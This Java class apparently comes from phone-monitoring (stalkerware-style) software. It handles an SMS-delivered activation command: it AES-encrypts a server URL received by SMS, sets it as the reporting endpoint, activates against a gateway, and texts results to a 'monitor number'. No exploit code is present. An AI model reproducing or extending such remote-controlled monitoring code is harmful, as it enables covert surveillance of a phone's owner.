package com.vvt.rmtcmd.sms;

import com.vvt.encryption.AESEncryptor;
import com.vvt.encryption.AESKeyGenerator;
import com.vvt.global.Global;
import com.vvt.info.ServerUrl;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.SendActivateCmdResponse;
import com.vvt.protmgr.PhoenixProtocolListener;
import com.vvt.protmgr.SendActivateManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class CmdActivation extends RmtCmdAsync implements PhoenixProtocolListener {
	
	private SendActivateManager actManager = Global.getSendActivateManager();
	private ServerUrl serverUrl = Global.getServerUrl();
	
	public CmdActivation(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		// Activation command will send SMS back to the number that is set on the RmtCmdLine.
		smsMessage.setNumber(rmtCmdLine.getMonitorNumber());
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(smsCmdCode.getActivationCmd());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Runnable
	public void run() {
		try {
			String url = rmtCmdLine.getUrl() + "/Phoenix-WAR-CyclopsCore/gateway";
			byte[] key = AESKeyGenerator.generateAESKey();
			byte[] encryptedUrl = AESEncryptor.encrypt(key, url.getBytes());
			serverUrl.setServerActivationUrl(key, encryptedUrl);
			serverUrl.setServerDeliveryUrl(key, encryptedUrl);
			actManager.addListener(this);
			actManager.activate();
		} catch(Exception e) {
			doSMSHeader();
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			smsMessage.setMessage(responseMessage.toString());
			send();
		}
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
	
	// PhoenixProtocolListener
	public void onError(String message) {
		actManager.removeListener(this);
		doSMSHeader();
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	public void onSuccess(CmdResponse response) {
		actManager.removeListener(this);
		if (response instanceof SendActivateCmdResponse) {
			SendActivateCmdResponse sendActRes = (SendActivateCmdResponse)response;
			if (sendActRes.getStatusCode() != 0) {
				doSMSHeader();
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append("Server Message: ");
				responseMessage.append(sendActRes.getServerMsg());
				responseMessage.append(Constant.SPACE);
				responseMessage.append(Constant.OPEN_BRACKET);
				responseMessage.append("0x");
				responseMessage.append(Integer.toHexString(sendActRes.getStatusCode()).toUpperCase());
				responseMessage.append(Constant.CLOSE_BRACKET);
				smsMessage.setMessage(responseMessage.toString());
				send();
			}
		}
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdActivation.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
